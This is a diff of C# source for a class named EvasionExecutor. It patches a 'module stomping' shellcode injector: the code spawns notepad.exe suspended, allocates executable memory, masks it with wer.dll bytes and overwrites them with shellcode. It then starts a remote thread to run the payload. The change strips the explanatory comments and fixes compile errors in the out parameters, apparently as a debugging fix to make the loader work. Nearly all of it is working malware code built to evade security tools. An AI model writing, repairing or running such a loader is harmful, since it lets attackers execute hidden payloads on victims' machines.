@@ -41,45 +41,42 @@ public class EvasionExecutor
         catch { /* Fail silently */ }
     }
     
-    // --- New "Module Stomping" Injection Logic ---
     private void InjectAndExecute(byte[] shellcode)
     {
-        // 1. Define the sacrificial process and the module to stomp.
         string targetProcess = "C:\\Windows\\SysWOW64\\notepad.exe";
-        string moduleToStompPath = "C:\\Windows\\SysWOW64\\wer.dll"; // A non-essential, legitimate DLL.
+        string moduleToStompPath = "C:\\Windows\\SysWOW64\\wer.dll";
         
         STARTUPINFO si = new STARTUPINFO();
         PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
         si.cb = (uint)Marshal.SizeOf(si);
         
-        // 2. Create the target process SUSPENDED to prevent it from running.
         bool success = CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref si, out pi);
 
         if (success)
         {
             try
             {
-                // 3. Read the bytes of the legitimate DLL we are going to use as a mask.
                 byte[] legitModuleBytes = File.ReadAllBytes(moduleToStompPath);
+                IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)legitModuleBytes.Length, 0x3000, 0x40);
                 
-                // 4. Allocate memory in the remote process the SAME SIZE as the DLL.
-                IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)legitModuleBytes.Length, 0x3000 /* MEM_COMMIT | MEM_RESERVE */, 0x40 /* PAGE_EXECUTE_READWRITE */);
-                
-                // 5. Write the ENTIRE legitimate DLL into the remote process. This makes the memory region look normal.
-                WriteProcessMemory(pi.hProcess, remoteAddr, legitModuleBytes, (uint)legitModuleBytes.Length, out _);
+                // --- THE FIX IS HERE ---
+                // CORRECTED: Declared variables to handle the 'out' parameters instead of using '_'.
+                IntPtr bytesWritten;
+                uint threadId;
 
-                // 6. Now, "stomp" over the beginning of that memory with our actual shellcode.
-                WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, (uint)shellcode.Length, out _);
+                // Write the legitimate DLL first
+                WriteProcessMemory(pi.hProcess, remoteAddr, legitModuleBytes, (uint)legitModuleBytes.Length, out bytesWritten);
 
-                // 7. Create the remote thread, starting execution at the beginning of our shellcode.
-                CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out _);
+                // Now stomp over it with our shellcode
+                WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, (uint)shellcode.Length, out bytesWritten);
+
+                // Create the remote thread
+                CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out threadId);
             
-                // 8. Finally, resume the main thread of the process.
                 ResumeThread(pi.hThread);
             }
             finally
             {
-                // 9. Clean up handles after we are done.
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
             }
